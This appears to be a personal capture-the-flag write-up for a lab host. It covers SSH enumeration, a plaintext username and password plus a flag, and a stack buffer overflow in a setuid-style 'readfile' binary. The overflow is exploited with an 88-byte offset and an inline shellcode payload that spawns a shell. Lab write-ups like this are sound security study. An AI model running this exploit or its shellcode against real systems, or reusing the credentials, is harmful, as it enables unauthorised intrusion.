# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
`FoundCREDs`
- `DANTE{0verfl0wing_l1k3_craz33!}`
## External
### Enumeration
```shell
[+] 172.16.2.101:22       - SSH server version: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1 ( service.version=8.2p1 openssh.comment=Ubuntu-4ubuntu0.1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:8.2p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=20.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:20.04 service.protocol=ssh fingerprint_db=ssh.banner )
```
![](https://i.imgur.com/xrsZ6Jp.png)
```shell
| vulners:
|   cpe:/a:openbsd:openssh:8.2p1:
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	CVE-2020-12062	7.5	https://vulners.com/cve/CVE-2020-12062
|     	CVE-2021-28041	7.1	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	PRION:CVE-2020-15778	6.8	https://vulners.com/prion/PRION:CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	6.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	6.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	PRION:CVE-2020-12062	5.0	https://vulners.com/prion/PRION:CVE-2020-12062
|     	PRION:CVE-2021-28041	4.6	https://vulners.com/prion/PRION:CVE-2021-28041
|     	PRION:CVE-2021-41617	4.4	https://vulners.com/prion/PRION:CVE-2021-41617
|     	PRION:CVE-2020-14145	4.3	https://vulners.com/prion/PRION:CVE-2020-14145
|     	PRION:CVE-2016-20012	4.3	https://vulners.com/prion/PRION:CVE-2016-20012
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|_    	PRION:CVE-2021-36368	2.6	https://vulners.com/prion/PRION:CVE-2021-36368
```
![](https://i.imgur.com/GlX1Io4.png)
### Gaining Access
![](https://i.imgur.com/MYwque9.png)
- ` julian : manchesterunited `
## Internal
### Enumeration
```shell
test     pts/0        Mon Jun 29 06:25:56 2020 - Tue Jun 30 02:30:56 2020  (20:05)     172.16.88.131
julian   pts/0        Mon Jun 29 04:33:41 2020 - Mon Jun 29 06:02:26 2020  (01:28)     172.16.88.131
```
![](https://i.imgur.com/3Zk4Rp0.png)
![](https://i.imgur.com/7XaQJHk.png)
- `/usr/sbin/readfile`
 ![](https://i.imgur.com/2lPAkG0.png)
![](https://i.imgur.com/WWt8U7u.png)
![](https://i.imgur.com/jj0QGsp.png)
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
### Gaining Access

![](https://i.imgur.com/ftoEhE3.png)
- Meaning we got `88` as offset so if i send 88 A's and 1 Byte of B data, it will write the BBBBBBBB on the $rsp. 
![](https://i.imgur.com/sgT0GEb.png)
- Because of the Canonical Address on `x64` binary i used this payload and boom, now we can write on the `$rip` this means i can call any function i want.
```shell
~ > 10.10.14.8 $ python2 -c 'print "A"*88 + "B"*6'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
```
![](https://i.imgur.com/UUgDDak.png)
>[!tip] JOHN HAMMOND Has Good Video on this https://www.youtube.com/watch?v=eg0gULifHFI&ab_channel=JohnHammond

```shell
/usr/sbin/readfile $(python2 -c 'print "A"*88+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
```
![](https://i.imgur.com/kEcWEOw.png)
![](https://i.imgur.com/RaHeAD6.png)
### Maintaining Access
![](https://i.imgur.com/jAQzXyc.png)
- we got new host
	- [[Dante - NIX06]]

# Random Notes